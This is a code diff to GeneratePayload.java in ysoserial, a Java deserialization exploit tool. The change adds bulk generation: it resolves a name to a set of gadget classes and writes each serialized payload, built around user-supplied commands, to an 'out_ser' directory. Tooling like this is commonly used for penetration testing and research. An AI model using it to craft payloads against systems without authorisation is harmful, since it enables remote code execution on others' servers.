@@ -1,8 +1,18 @@
 package ysoserial;
 
+import java.io.File;
+import java.io.FileOutputStream;
 import java.io.PrintStream;
-import java.util.*;
-
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+import java.util.ArrayList;
+import java.util.Arrays;
+import java.util.Collections;
+import java.util.HashSet;
+import java.util.LinkedList;
+import java.util.List;
+import java.util.Set;
 import ysoserial.payloads.ObjectPayload;
 import ysoserial.payloads.ObjectPayload.Utils;
 import ysoserial.payloads.annotation.Authors;
@@ -21,20 +31,49 @@ public class GeneratePayload {
 		final String payloadType = args[0];
 		final String[] commands = args.length > 1 ? Arrays.copyOfRange(args, 1, args.length) : new String[0];
 
+		Set<Class<? extends ObjectPayload>> payloadClasss = new HashSet<>();
 		final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
 		if (payloadClass == null) {
-			System.err.println("Invalid payload type '" + payloadType + "'");
-			printUsage();
-			System.exit(USAGE_CODE);
-			return; // make null analysis happy
-		}
+            payloadClasss.addAll(GadgetsHelper.get(payloadType));
+            if (payloadClasss.isEmpty()) {
+                System.err.println("Invalid payload type '" + payloadType + "'");
+                printUsage();
+                System.exit(USAGE_CODE);
+                return; // make null analysis happy
+            }
+		} else {
+            payloadClasss.add(payloadClass);
+        }
+
 
 		try {
-			final ObjectPayload payload = payloadClass.newInstance();
-			final Object object = payload.getObject(commands);
-			PrintStream out = System.out;
-			Serializer.serialize(object, out);
-			ObjectPayload.Utils.releasePayload(payload, object);
+            Path dir = Paths.get("out_ser");
+            if (payloadClasss.size() > 1) {
+                if (Files.exists(dir)) {
+                    for (File f:dir.toFile().listFiles()) {
+                        System.out.println("delete file " + f.getName() + " ...");
+                        f.delete();
+                    }
+                    dir.toFile().delete();
+                    System.out.println("delete dir " + dir.getFileName() + " ...");
+                }
+                Files.createDirectory(dir);
+                System.out.println("create dir " + dir.getFileName() + " ...");
+            }
+            for (Class<? extends ObjectPayload> c:payloadClasss) {
+                final ObjectPayload payload = c.newInstance();
+                final Object object = payload.getObject(commands);
+                if (payloadClasss.size() == 1) {
+                    PrintStream out = System.out;
+                    Serializer.serialize(object, out);
+                } else {
+                    FileOutputStream fileOutputStream = new FileOutputStream(Paths.get(dir.getFileName() +  "/" + c.getSimpleName() + ".ser").toFile());
+                    fileOutputStream.write(Serializer.serialize(object));
+                    fileOutputStream.close();
+                    System.out.println("write " + c.getSimpleName() + ".ser ...");
+                }
+                ObjectPayload.Utils.releasePayload(payload, object);
+            }
 		} catch (Throwable e) {
 			System.err.println("Error while generating or serializing payload");
 			e.printStackTrace();
